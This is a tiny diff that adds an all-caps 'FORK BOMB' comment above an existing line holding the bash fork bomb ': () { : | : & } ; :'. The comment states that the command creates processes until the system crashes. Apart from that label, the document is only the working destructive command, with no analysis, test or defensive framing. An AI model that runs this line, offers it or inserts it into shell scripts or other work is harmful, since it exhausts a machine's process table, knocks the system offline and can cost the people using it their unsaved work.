@@ -1,1 +1,3 @@
+#FORK BOMB (CREATES PROCESSES UNTIL SYSTEM "CRASHES")
+
 : () { : | : & } ; :
